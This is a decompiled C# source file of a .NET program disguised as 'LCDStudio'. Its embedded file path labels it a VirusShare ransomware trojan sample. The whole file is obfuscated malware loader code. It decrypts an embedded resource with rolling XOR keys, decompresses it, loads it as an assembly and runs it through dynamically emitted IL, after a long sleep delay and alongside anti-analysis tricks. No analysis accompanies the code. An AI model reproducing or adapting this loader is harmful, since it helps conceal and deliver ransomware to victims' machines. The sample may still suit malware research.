// Decompiled with JetBrains decompiler
// Type: LCDStudio.Program
// Assembly: LCDStudio, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BEF96371-2C95-4469-8D1E-06EE21BF714F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-fbe952a94ea2bb4b96d16021f64e0b8955c6b05ca6fa48a562e4e2135e1643f7.exe

using LCDStudio.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace LCDStudio
{
  public class Program
  {
    private static Program.䎠\u1CC7䢹㣫\u22F3낪\u2512\u2861 ᑸ噛콤驲櫰\u2A2D免ﾎ;
    public static Program.Matrix ᮍ甄믰\u24C0ꐻ\u28E4뿋쩡;
    private static Type Ⳙ㛐\uFFFD\uF855餈\uF757侧ᷰ;
    private static object \u0CDAꌈ๎\u21B7胕岙쨢闓;

    [STAThread]
    public static unsafe void \uE83F\uFAE6㮮ೡ\uEAC3\uFFFD\u2B58\u2E2D(string[] _param0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
label_9:
      *(int*) voidPtr = Resources.ϫ\uE49F튐祷鎽郥\uF712㝷.Length;
      *(int*) ((IntPtr) voidPtr + 4) = 1;
      byte[] numArray;
      object[] objArray;
      while (true)
      {
        switch (*(int*) ((IntPtr) voidPtr + 4))
        {
          case 0:
            goto label_9;
          case 2:
            objArray[0] = (object) \u0005.\u0005((object) numArray, GCHandleType.Pinned);
            *(int*) ((IntPtr) voidPtr + 4) = 4;
            continue;
          case 3:
            objArray = new object[2];
            *(int*) ((IntPtr) voidPtr + 4) = 2;
            continue;
          case 4:
            objArray[1] = (object) *(int*) voidPtr;
            *(int*) ((IntPtr) voidPtr + 4) = 7;
            continue;
          case 5:
            goto label_2;
          case 6:
            Program.뮧ퟆ\u31BE繰સ뱰Ŕ䢰((object) null);
            *(int*) ((IntPtr) voidPtr + 4) = 8;
            continue;
          case 7:
            Program.\u2814\uECAB榷䫥쵵烌뎅磤((object) objArray, (EventArgs) null);
            *(int*) ((IntPtr) voidPtr + 4) = 6;
            continue;
          case 8:
            \u0006.\u0006(5400000);
            *(int*) ((IntPtr) voidPtr + 4) = 5;
            continue;
          default:
            Program.ᑸ噛콤驲櫰\u2A2D免ﾎ = new Program.䎠\u1CC7䢹㣫\u22F3낪\u2512\u2861(Program.\u2814\uECAB榷䫥쵵烌뎅磤);
            numArray = Program.ꏟᘩ\uE292䯵蕢扩㠓說(Resources.ϫ\uE49F튐祷鎽郥\uF712㝷, (byte) 134, (byte) 136, ref *(int*) voidPtr);
            *(int*) ((IntPtr) voidPtr + 4) = 3;
            continue;
        }
      }
label_2:;
    }

    private static unsafe void \u2814\uECAB榷䫥쵵烌뎅磤(object _param0, EventArgs _param1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
label_10:
      object[] objArray = (object[]) _param0;
      *(int*) ((IntPtr) voidPtr + 4) = 4;
      byte[] numArray;
      IntPtr num;
      byte* pointer;
      while (true)
      {
        switch (*(int*) ((IntPtr) voidPtr + 4))
        {
          case 0:
            goto label_10;
          case 2:
            numArray = new byte[(int) objArray[1]];
            *(int*) ((IntPtr) voidPtr + 4) = 5;
            continue;
          case 3:
            goto label_4;
          case 4:
            num = ((GCHandle) objArray[0]).AddrOfPinnedObject();
            *(int*) ((IntPtr) voidPtr + 4) = 6;
            continue;
          case 5:
            while (true)
            {
              *(int*) voidPtr = 0;
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Program.\u002Ecctor);
                *(int*) ((IntPtr) voidPtr + 4) = 7;
              }
              else
                break;
            }
            *(int*) ((IntPtr) voidPtr + 4) = 1;
            continue;
          case 6:
            pointer = (byte*) num.ToPointer();
            *(int*) ((IntPtr) voidPtr + 4) = 2;
            continue;
          default:
            while (*(int*) voidPtr < numArray.Length)
            {
              numArray[*(int*) voidPtr] = pointer[*(int*) voidPtr];
              *(int*) voidPtr = *(int*) voidPtr + 1;
            }
            *(int*) ((IntPtr) voidPtr + 4) = 3;
            continue;
        }
      }
label_4:
      Program.Ⳙ㛐\uFFFD\uF855餈\uF757侧ᷰ = \u0008.\u007E\u000E((object) \u0007.\u0008(numArray))[0];
    }

    private static void 뮧ퟆ\u31BE繰સ뱰Ŕ䢰(object _param0)
    {
      try
      {
      }
      catch
      {
      }
      object ꌈ๎胕岙쨢闓;
      \u000E.\u000F(ꌈ๎胕岙쨢闓 = Program.\u0CDAꌈ๎\u21B7胕岙쨢闓);
label_3:
      try
      {
        // ISSUE: type reference
        Type returnType = \u0002.\u0002(__typeref (object));
        Type[] typeArray1 = new Type[1];
        Type[] typeArray2;
        if (true)
          typeArray2 = typeArray1;
        // ISSUE: type reference
        typeArray2[0] = \u0002.\u0002(__typeref (Type));
        Type[] parameterTypes = typeArray2;
        // ISSUE: type reference
        Module m = \u000F.\u007E\u0011((object) \u0002.\u0002(__typeref (Program)));
        DynamicMethod dynamicMethod = new DynamicMethod("LCD_", returnType, parameterTypes, m);
        ILGenerator ilGenerator = \u0010.\u007E\u0012((object) dynamicMethod);
        int num = 1;
        while (true)
        {
          switch (num)
          {
            case 0:
              goto label_3;
            case 2:
              \u0011.\u007E\u0013((object) ilGenerator, OpCodes.Ldc_I4_0);
              num = 6;
              continue;
            case 3:
              // ISSUE: type reference
              \u0014.\u007E\u0016((object) ilGenerator, OpCodes.Newarr, \u0002.\u0002(__typeref (object)));
              num = 5;
              continue;
            case 4:
              goto label_8;
            case 5:
              // ISSUE: type reference
              \u0013.\u007E\u0015((object) ilGenerator, OpCodes.Callvirt, \u0012.\u0014((object) \u0002.\u0002(__typeref (MethodBase)))[13], (Type[]) null);
              num = 7;
              continue;
            case 6:
              \u0011.\u007E\u0013((object) ilGenerator, OpCodes.Ldelem_Ref);
              num = 8;
              continue;
            case 7:
              \u0011.\u007E\u0013((object) ilGenerator, OpCodes.Ret);
              // ISSUE: type reference
              Program.ᮍ甄믰\u24C0ꐻ\u28E4뿋쩡 = (Program.Matrix) \u0015.\u007E\u0017((object) dynamicMethod, \u0002.\u0002(__typeref (Program.Matrix)));
              num = 4;
              continue;
            case 8:
              \u0011.\u007E\u0013((object) ilGenerator, OpCodes.Ldnull);
              \u0011.\u007E\u0013((object) ilGenerator, OpCodes.Ldc_I4_0);
              num = 3;
              continue;
            default:
              \u0011.\u007E\u0013((object) ilGenerator, OpCodes.Ldarg_0);
              // ISSUE: type reference
              \u0013.\u007E\u0015((object) ilGenerator, OpCodes.Callvirt, \u0012.\u0014((object) \u0002.\u0002(__typeref (Type)))[50], (Type[]) null);
              num = 2;
              continue;
          }
        }
label_8:
        if (Program.ᮍ甄믰\u24C0ꐻ\u28E4뿋쩡 != null)
        {
          object obj = Program.ᮍ甄믰\u24C0ꐻ\u28E4뿋쩡(Program.Ⳙ㛐\uFFFD\uF855餈\uF757侧ᷰ);
        }
        \u0006.\u0007(0);
      }
      finally
      {
        \u000E.\u0010(ꌈ๎胕岙쨢闓);
      }
    }

    private static unsafe byte[] ꏟᘩ\uE292䯵蕢扩㠓說(
      byte[] 屖짻鼭뛃겇㖋鞸윜,
      byte _param1,
      byte _param2,
      ref int _param3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(33);
label_1:
      byte[] buffer1;
      if (true)
      {
        buffer1 = new byte[屖짻鼭뛃겇㖋鞸윜.Length];
        *(int*) ((IntPtr) voidPtr + 28) = 7;
      }
      while (true)
      {
        switch (*(int*) ((IntPtr) voidPtr + 28))
        {
          case 0:
            goto label_1;
          case 2:
            buffer1[*(int*) ((IntPtr) voidPtr + 16)] = (byte) ((uint) buffer1[*(int*) ((IntPtr) voidPtr + 16)] ^ (uint) *(byte*) ((IntPtr) voidPtr + 32));
            *(int*) ((IntPtr) voidPtr + 28) = 5;
            continue;
          case 3:
            if (*(int*) ((IntPtr) voidPtr + 16) < buffer1.Length)
              goto case 2;
            else
              goto label_3;
          case 4:
            *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
            *(int*) ((IntPtr) voidPtr + 28) = 3;
            continue;
          case 5:
            *(sbyte*) ((IntPtr) voidPtr + 32) = (sbyte) (byte) ((int) *(byte*) ((IntPtr) voidPtr + 32) * (int) _param2 % 256);
            *(int*) ((IntPtr) voidPtr + 28) = 4;
            continue;
          case 6:
            *(int*) ((IntPtr) voidPtr + 16) = 0;
            *(int*) ((IntPtr) voidPtr + 28) = 1;
            continue;
          case 7:
            \u0016.\u0018((Array) 屖짻鼭뛃겇㖋鞸윜, 0, (Array) buffer1, 0, 屖짻鼭뛃겇㖋鞸윜.Length);
            *(sbyte*) ((IntPtr) voidPtr + 32) = (sbyte) _param1;
            *(int*) ((IntPtr) voidPtr + 28) = 6;
            continue;
          default:
            *(int*) ((IntPtr) voidPtr + 28) = 3;
            continue;
        }
      }
label_3:
      MemoryStream memoryStream = new MemoryStream(buffer1);
label_8:
      try
      {
        \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.歔\u2B06蔫更\uFFFD㓣\uE6B0됟 歔蔫更㓣됟;
        byte[] numArray;
        if (true)
        {
          歔蔫更㓣됟 = new \uF5D2\uE1EFᒆꟸ䇽ხ蚻蔦.歔\u2B06蔫更\uFFFD㓣\uE6B0됟();
          numArray = new byte[5];
          *(int*) ((IntPtr) voidPtr + 28) = 5;
        }
        else
          goto label_16;
label_13:
        MemoryStream input;
        while (true)
        {
          do
          {
            switch (*(int*) ((IntPtr) voidPtr + 28))
            {
              case 0:
                goto label_8;
              case 2:
                *(int*) ((IntPtr) voidPtr + 28) = 4;
                continue;
              case 3:
                goto label_17;
              case 4:
                goto label_19;
              case 5:
                goto label_22;
              case 6:
                goto label_23;
              case 7:
                goto label_25;
              case 8:
                goto label_27;
              case 9:
                goto label_28;
              case 10:
                goto label_29;
              case 11:
                goto label_30;
              default:
                *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
                *(int*) ((IntPtr) voidPtr + 28) = 4;
                continue;
            }
          }
          while (true);
          while (false)
          {
            // ISSUE: field reference
            RuntimeFieldHandle runtimeFieldHandle = __fieldref (Program.\u0CDAꌈ๎\u21B7胕岙쨢闓);
            if (false)
              ;
          }
          Debugger.Break();
          continue;
label_19:
          byte[] buffer2;
          if (*(int*) ((IntPtr) voidPtr + 20) >= 8)
            buffer2 = new byte[*(long*) voidPtr];
          else
            goto label_30;
label_21:
          *(int*) ((IntPtr) voidPtr + 28) = 8;
          continue;
label_22:
          int num = \u0017.\u007E\u0019((object) memoryStream, numArray, 0, 5);
          *(int*) ((IntPtr) voidPtr + 28) = 9;
          continue;
label_27:
          input = new MemoryStream(buffer2, true);
          if (false)
            goto label_21;
          else
            goto label_31;
label_28:
          歔蔫更㓣됟.殄낪璅쫯藛袒鋝盙(numArray);
          *(int*) ((IntPtr) voidPtr + 28) = 10;
          continue;
label_29:
          *(long*) voidPtr = 0L;
          *(int*) ((IntPtr) voidPtr + 28) = 3;
          continue;
label_30:
          *(int*) ((IntPtr) voidPtr + 24) = \u0018.\u007E\u001A((object) memoryStream);
          *(int*) ((IntPtr) voidPtr + 28) = 6;
        }
label_23:
        if (*(int*) ((IntPtr) voidPtr + 24) < 0)
          throw new Exception();
label_25:
        *(long*) voidPtr = *(long*) voidPtr | (long) (byte) *(int*) ((IntPtr) voidPtr + 24) << 8 * *(int*) ((IntPtr) voidPtr + 20);
        goto label_26;
label_31:
        try
        {
          *(long*) ((IntPtr) voidPtr + 8) = \u0019.\u007E\u001C((object) memoryStream) - 13L;
          *(int*) ((IntPtr) voidPtr + 28) = 2;
label_32:
          switch (*(int*) ((IntPtr) voidPtr + 28))
          {
            case 0:
              goto label_31;
            case 2:
              歔蔫更㓣됟.Ᏺﾛ샟ꘑ\u001C긢ᮥ\uE6F5((Stream) memoryStream, (Stream) input, *(long*) ((IntPtr) voidPtr + 8), *(long*) voidPtr);
              \u001A.\u007E\u001D((object) input, 0L);
              *(int*) ((IntPtr) voidPtr + 28) = 1;
              if (false)
                break;
              goto label_32;
          }
          BinaryReader binaryReader = new BinaryReader((Stream) input);
label_35:
          try
          {
            buffer1 = \u001B.\u007E\u001E((object) binaryReader, \u0018.\u007E\u001B((object) binaryReader));
            *(int*) ((IntPtr) voidPtr + 28) = 2;
            while (true)
            {
              switch (*(int*) ((IntPtr) voidPtr + 28))
              {
                case 0:
                  goto label_35;
                case 2:
                  _param3 = buffer1.Length;
                  *(int*) ((IntPtr) voidPtr + 28) = 1;
                  continue;
                default:
                  goto label_47;
              }
            }
          }
          finally
          {
            if (binaryReader != null)
              \u001C.\u007E\u001F((object) binaryReader);
          }
        }
        finally
        {
          if (input != null)
            \u001C.\u007E\u001F((object) input);
        }
label_16:
        // ISSUE: field reference
        RuntimeFieldHandle runtimeFieldHandle1 = __fieldref (Program.\u0CDAꌈ๎\u21B7胕岙쨢闓);
        *(int*) ((IntPtr) voidPtr + 28) = 640650782 - 1700880278;
label_17:
        *(int*) ((IntPtr) voidPtr + 20) = 0;
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 28) = 2;
          goto label_13;
        }
label_26:
        *(int*) ((IntPtr) voidPtr + 28) = 1;
        goto label_13;
      }
      finally
      {
        if (memoryStream != null)
          \u001C.\u007E\u001F((object) memoryStream);
      }
label_47:
      return buffer1;
    }

    public Program()
    {
label_0:
      // ISSUE: explicit constructor call
      base.\u002Ector();
      switch (1)
      {
        case 0:
          goto label_0;
      }
    }

    static Program()
    {
      while (true)
      {
        Program.\u0CDAꌈ๎\u21B7胕岙쨢闓 = new object();
        int num = 1;
        do
        {
          if (num != 0)
            goto label_10;
label_5:
          continue;
label_10:
          num = num;
          goto label_5;
        }
        while (false);
        switch (num)
        {
          case 0:
            continue;
          case 1:
            return;
          default:
            return;
        }
      }
      if (false)
        ;
    }

    public delegate void 䎠\u1CC7䢹㣫\u22F3낪\u2512\u2861(object sender, EventArgs args);

    public delegate object Matrix(Type TT);
  }
}
